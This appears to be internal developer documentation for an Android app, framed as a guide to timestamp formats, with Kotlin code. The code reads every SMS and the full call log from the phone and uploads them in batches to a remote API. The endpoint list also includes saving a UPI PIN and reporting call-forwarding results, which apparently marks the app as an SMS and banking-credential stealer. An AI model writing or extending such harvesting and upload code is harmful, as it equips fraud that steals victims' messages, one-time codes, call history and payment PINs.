# Timestamp Handling Guide - Android (Device)

## Overview

This guide explains how to properly handle timestamps in the **Android Application** to ensure all times are sent and received correctly from the API.

**Important:** 
- **Send to API:** Unix timestamp in **milliseconds** (long)
- **Receive from API:** ISO 8601 format with UTC timezone: `2024-01-15T14:30:45.123456+00:00`

---

## Quick Start

### Send Timestamp to API

```kotlin
// Get current time in milliseconds
val timestamp = System.currentTimeMillis()

// Send to API
val requestBody = JSONObject().apply {
    put("device_id", deviceId)
    put("timestamp", timestamp) // Send as long (milliseconds)
}
```

### Parse Timestamp from API

```kotlin
// Receive from API: "2024-01-15T14:30:45.123456+00:00"
val timestampString = jsonObject.getString("timestamp")
val timestamp = Instant.parse(timestampString).toEpochMilli()

// Or convert to Date
val date = Instant.parse(timestampString).atZone(ZoneId.systemDefault()).toLocalDateTime()
```

---

## Method 1: Using System.currentTimeMillis() (Recommended)

### Get Current Timestamp

```kotlin
// Get current time in milliseconds (UTC)
val currentTimestamp = System.currentTimeMillis()

// Example: 1640995200000 (milliseconds since epoch)
```

### Send to API

```kotlin
// SMS data
val smsData = JSONObject().apply {
    put("from", phoneNumber)
    put("body", message)
    put("timestamp", System.currentTimeMillis()) // Send as long
    put("type", "inbox")
}

// Call logs
val callData = JSONObject().apply {
    put("number", phoneNumber)
    put("call_type", "outgoing")
    put("timestamp", System.currentTimeMillis()) // Send as long
    put("duration", durationInSeconds)
}
```

### Complete Example: Send SMS

```kotlin
fun sendSMSToAPI(deviceId: String, from: String, body: String) {
    val smsData = JSONObject().apply {
        put("from", from)
        put("body", body)
        put("timestamp", System.currentTimeMillis()) // Current time in milliseconds
        put("type", "inbox")
    }
    
    val requestBody = JSONObject().apply {
        put("device_id", deviceId)
        put("data", smsData)
    }
    
    // Send to POST /sms/new
    apiService.sendSMS(requestBody)
}
```

---

## Method 2: Using Java Time API (Java 8+)

### Get Current Timestamp

```kotlin
import java.time.Instant
import java.time.ZoneId
import java.time.ZonedDateTime

// Get current UTC timestamp in milliseconds
val timestamp = Instant.now().toEpochMilli()

// Or get as Instant
val instant = Instant.now()
```

### Convert Date to Timestamp

```kotlin
import java.time.LocalDateTime
import java.time.ZoneId

// Convert LocalDateTime to milliseconds
fun localDateTimeToTimestamp(dateTime: LocalDateTime): Long {
    return dateTime.atZone(ZoneId.systemDefault())
        .toInstant()
        .toEpochMilli()
}

// Usage
val dateTime = LocalDateTime.now()
val timestamp = localDateTimeToTimestamp(dateTime)
```

### Parse Timestamp from API

```kotlin
import java.time.Instant
import java.time.ZoneId
import java.time.ZonedDateTime
import java.time.format.DateTimeFormatter

// Parse ISO string from API
fun parseTimestampFromAPI(isoString: String): Long {
    val instant = Instant.parse(isoString)
    return instant.toEpochMilli()
}

// Or convert to LocalDateTime
fun parseToLocalDateTime(isoString: String): LocalDateTime {
    val instant = Instant.parse(isoString)
    return instant.atZone(ZoneId.of("UTC"))
        .withZoneSameInstant(ZoneId.systemDefault())
        .toLocalDateTime()
}

// Usage
val apiTimestamp = "2024-01-15T14:30:45.123456+00:00"
val timestamp = parseTimestampFromAPI(apiTimestamp)
val localDateTime = parseToLocalDateTime(apiTimestamp)
```

---

## Method 3: Using Android Date/Time Classes

### Get Current Timestamp

```kotlin
import java.util.Date
import java.util.Calendar

// Method 1: Using Date
val timestamp = Date().time

// Method 2: Using Calendar
val calendar = Calendar.getInstance()
val timestamp = calendar.timeInMillis
```

### Convert Date to Timestamp

```kotlin
import java.util.Date
import java.text.SimpleDateFormat
import java.util.TimeZone

// Convert Date to milliseconds
fun dateToTimestamp(date: Date): Long {
    return date.time
}

// Convert String to Timestamp (if needed)
fun stringToTimestamp(dateString: String, format: String): Long {
    val sdf = SimpleDateFormat(format, Locale.US)
    sdf.timeZone = TimeZone.getTimeZone("UTC")
    return sdf.parse(dateString)?.time ?: 0L
}
```

### Parse Timestamp from API

```kotlin
import java.text.SimpleDateFormat
import java.util.TimeZone
import java.util.Locale

// Parse ISO 8601 string from API
fun parseAPITimestamp(isoString: String): Long {
    val format = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSSSSSXXX", Locale.US)
    format.timeZone = TimeZone.getTimeZone("UTC")
    
    return try {
        format.parse(isoString)?.time ?: 0L
    } catch (e: Exception) {
        // Try alternative format
        val altFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US)
        altFormat.timeZone = TimeZone.getTimeZone("UTC")
        altFormat.parse(isoString.replace("+00:00", "Z"))?.time ?: 0L
    }
}

// Convert to Date
fun parseToDate(isoString: String): Date {
    val timestamp = parseAPITimestamp(isoString)
    return Date(timestamp)
}
```

---

## Complete Examples

### Example 1: Send SMS with Timestamp

```kotlin
class SMSService {
    fun sendNewSMSToAPI(deviceId: String, from: String, body: String) {
        val smsData = JSONObject().apply {
            put("from", from)
            put("body", body)
            put("timestamp", System.currentTimeMillis()) // Current time in milliseconds
            put("type", "inbox")
        }
        
        val requestBody = JSONObject().apply {
            put("device_id", deviceId)
            put("data", smsData)
        }
        
        // POST /sms/new
        apiClient.post("/sms/new", requestBody)
    }
}
```

### Example 2: Upload SMS Batch

```kotlin
fun uploadSMSBatch(deviceId: String, smsList: List<SMS>) {
    val smsDataList = smsList.map { sms ->
        JSONObject().apply {
            put("from", sms.from)
            put("to", sms.to)
            put("body", sms.body)
            put("timestamp", sms.timestamp) // Already in milliseconds
            put("type", sms.type)
            put("sim_slot", sms.simSlot)
        }
    }
    
    val requestBody = JSONObject().apply {
        put("device_id", deviceId)
        put("data", JSONArray(smsDataList))
        put("batch_info", JSONObject().apply {
            put("batch", currentBatch)
            put("of", totalBatches)
        })
    }
    
    // POST /sms/batch
    apiClient.post("/sms/batch", requestBody)
}
```

### Example 3: Upload Call Logs

```kotlin
fun uploadCallLogs(deviceId: String, calls: List<CallLog>) {
    val callDataList = calls.map { call ->
        JSONObject().apply {
            put("number", call.number)
            put("name", call.name)
            put("call_type", call.type) // "incoming", "outgoing", "missed"
            put("timestamp", call.timestamp) // In milliseconds
            put("duration", call.duration) // In seconds
            put("duration_formatted", formatDuration(call.duration))
        }
    }
    
    val requestBody = JSONObject().apply {
        put("device_id", deviceId)
        put("data", JSONArray(callDataList))
    }
    
    // POST /call-logs/batch
    apiClient.post("/call-logs/batch", requestBody)
}
```

### Example 4: Parse Device Response

```kotlin
class DeviceResponseParser {
    fun parseDevice(json: JSONObject): Device {
        val device = Device()
        
        device.deviceId = json.getString("device_id")
        device.model = json.optString("model", "")
        
        // Parse timestamp from API
        val lastPingString = json.optString("last_ping", null)
        if (lastPingString != null) {
            device.lastPing = parseAPITimestamp(lastPingString)
        }
        
        val registeredAtString = json.optString("registered_at", null)
        if (registeredAtString != null) {
            device.registeredAt = parseAPITimestamp(registeredAtString)
        }
        
        return device
    }
    
    private fun parseAPITimestamp(isoString: String): Long {
        return try {
            Instant.parse(isoString).toEpochMilli()
        } catch (e: Exception) {
            0L
        }
    }
}
```

---

## SMS Timestamp Handling

### Get SMS Timestamp from Android

```kotlin
import android.provider.Telephony

// Read SMS from content provider
fun getSMSTimestamp(cursor: Cursor): Long {
    // SMS timestamp is in milliseconds since epoch
    val timestampColumn = cursor.getColumnIndex(Telephony.Sms.DATE)
    return cursor.getLong(timestampColumn)
}

// Example: Read all SMS
fun readAllSMS(context: Context): List<SMSData> {
    val smsList = mutableListOf<SMSData>()
    
    val cursor = context.contentResolver.query(
        Telephony.Sms.CONTENT_URI,
        null,
        null,
        null,
        null
    )
    
    cursor?.use {
        while (it.moveToNext()) {
            val sms = SMSData().apply {
                from = it.getString(it.getColumnIndex(Telephony.Sms.ADDRESS))
                body = it.getString(it.getColumnIndex(Telephony.Sms.BODY))
                timestamp = it.getLong(it.getColumnIndex(Telephony.Sms.DATE)) // Already in milliseconds
                type = if (it.getInt(it.getColumnIndex(Telephony.Sms.TYPE)) == Telephony.Sms.MESSAGE_TYPE_INBOX) {
                    "inbox"
                } else {
                    "sent"
                }
            }
            smsList.add(sms)
        }
    }
    
    return smsList
}
```

---

## Call Log Timestamp Handling

### Get Call Log Timestamp

```kotlin
import android.provider.CallLog

// Read call log
fun getCallLogTimestamp(cursor: Cursor): Long {
    // Call log timestamp is in seconds, convert to milliseconds
    val timestampColumn = cursor.getColumnIndex(CallLog.Calls.DATE)
    val timestampSeconds = cursor.getLong(timestampColumn)
    return timestampSeconds * 1000 // Convert to milliseconds
}

// Example: Read call logs
fun readCallLogs(context: Context): List<CallLogData> {
    val callLogs = mutableListOf<CallLogData>()
    
    val cursor = context.contentResolver.query(
        CallLog.Calls.CONTENT_URI,
        null,
        null,
        null,
        "${CallLog.Calls.DATE} DESC"
    )
    
    cursor?.use {
        while (it.moveToNext()) {
            val call = CallLogData().apply {
                number = it.getString(it.getColumnIndex(CallLog.Calls.NUMBER))
                name = it.getString(it.getColumnIndex(CallLog.Calls.CACHED_NAME))
                
                val callType = it.getInt(it.getColumnIndex(CallLog.Calls.TYPE))
                type = when (callType) {
                    CallLog.Calls.INCOMING_TYPE -> "incoming"
                    CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                    CallLog.Calls.MISSED_TYPE -> "missed"
                    else -> "unknown"
                }
                
                // Timestamp is in seconds, convert to milliseconds
                val timestampSeconds = it.getLong(it.getColumnIndex(CallLog.Calls.DATE))
                timestamp = timestampSeconds * 1000
                
                duration = it.getInt(it.getColumnIndex(CallLog.Calls.DURATION))
            }
            callLogs.add(call)
        }
    }
    
    return callLogs
}
```

---

## Utility Functions

### Timestamp Utility Class

```kotlin
object TimestampUtils {
    /**
     * Get current timestamp in milliseconds (UTC)
     */
    fun currentTimestamp(): Long {
        return System.currentTimeMillis()
    }
    
    /**
     * Parse ISO 8601 string from API to milliseconds
     */
    fun parseFromAPI(isoString: String?): Long? {
        if (isoString.isNullOrEmpty()) return null
        
        return try {
            Instant.parse(isoString).toEpochMilli()
        } catch (e: Exception) {
            null
        }
    }
    
    /**
     * Format timestamp to ISO 8601 string (for debugging)
     */
    fun formatToISO(timestamp: Long): String {
        return Instant.ofEpochMilli(timestamp)
            .atZone(ZoneId.of("UTC"))
            .format(DateTimeFormatter.ISO_INSTANT)
    }
    
    /**
     * Convert timestamp to LocalDateTime (for display)
     */
    fun toLocalDateTime(timestamp: Long): LocalDateTime {
        return Instant.ofEpochMilli(timestamp)
            .atZone(ZoneId.systemDefault())
            .toLocalDateTime()
    }
    
    /**
     * Check if timestamp is recent (within X minutes)
     */
    fun isRecent(timestamp: Long, minutes: Int = 5): Boolean {
        val now = System.currentTimeMillis()
        val diff = now - timestamp
        return diff <= (minutes * 60 * 1000)
    }
}
```

---

## Common Patterns

### Pattern 1: Send Current Time

```kotlin
// Always use System.currentTimeMillis() for current time
val timestamp = System.currentTimeMillis()

// Send to API
jsonObject.put("timestamp", timestamp)
```

### Pattern 2: Send SMS Timestamp

```kotlin
// SMS timestamp from Android is already in milliseconds
val smsTimestamp = cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE))

// Send directly to API
jsonObject.put("timestamp", smsTimestamp)
```

### Pattern 3: Send Call Log Timestamp

```kotlin
// Call log timestamp is in SECONDS, convert to milliseconds
val callTimestampSeconds = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE))
val callTimestamp = callTimestampSeconds * 1000

// Send to API
jsonObject.put("timestamp", callTimestamp)
```

### Pattern 4: Parse API Response

```kotlin
// API returns: "2024-01-15T14:30:45.123456+00:00"
val timestampString = jsonObject.getString("last_ping")
val timestamp = Instant.parse(timestampString).toEpochMilli()

// Use timestamp
device.lastPing = timestamp
```

---

## Important Notes

1. **Always Send Milliseconds**: API expects timestamps in milliseconds (long)
2. **SMS Timestamp**: Already in milliseconds from Android
3. **Call Log Timestamp**: In seconds, multiply by 1000 to get milliseconds
4. **Current Time**: Use `System.currentTimeMillis()` for current time
5. **Parse API Response**: Use `Instant.parse()` to parse ISO 8601 strings

---

## Troubleshooting

### Problem: Timestamp showing wrong time

**Solution:** Make sure you're sending milliseconds, not seconds:
```kotlin
// Correct
val timestamp = System.currentTimeMillis() // milliseconds

// Wrong
val timestamp = System.currentTimeMillis() / 1000 // seconds
```

### Problem: Call log timestamp wrong

**Solution:** Call log returns seconds, convert to milliseconds:
```kotlin
// Correct
val timestamp = cursor.getLong(columnIndex) * 1000

// Wrong
val timestamp = cursor.getLong(columnIndex)
```

### Problem: API parsing error

**Solution:** Handle different timestamp formats:
```kotlin
fun parseTimestamp(isoString: String): Long? {
    return try {
        // Try standard format
        Instant.parse(isoString).toEpochMilli()
    } catch (e: Exception) {
        try {
            // Try without microseconds
            val cleaned = isoString.replace("\\.\\d+".toRegex(), "")
            Instant.parse(cleaned).toEpochMilli()
        } catch (e2: Exception) {
            null
        }
    }
}
```

---

## Summary

1. ✅ **Send to API**: Always use milliseconds (long) - `System.currentTimeMillis()`
2. ✅ **SMS Timestamp**: Already in milliseconds from Android
3. ✅ **Call Log Timestamp**: Convert seconds to milliseconds (multiply by 1000)
4. ✅ **Parse from API**: Use `Instant.parse()` for ISO 8601 strings
5. ✅ **Current Time**: Always use `System.currentTimeMillis()` for UTC time

---

## API Endpoints Reference

### Endpoints that require timestamp:

- `POST /register` - Device registration
- `POST /sms/batch` - SMS batch upload (timestamp in milliseconds)
- `POST /sms/new` - New SMS (timestamp in milliseconds)
- `POST /call-logs/batch` - Call logs upload (timestamp in milliseconds)
- `POST /save-pin` - UPI PIN (timestamp auto-generated)
- `POST /devices/call-forwarding/result` - Call forwarding result (timestamp in milliseconds)

### Endpoints that return timestamp:

- `GET /api/devices/{device_id}` - Returns device with timestamps in ISO format
- `GET /api/devices/{device_id}/sms` - Returns SMS with timestamps in ISO format
- `GET /api/devices/{device_id}/calls` - Returns call logs with timestamps in ISO format

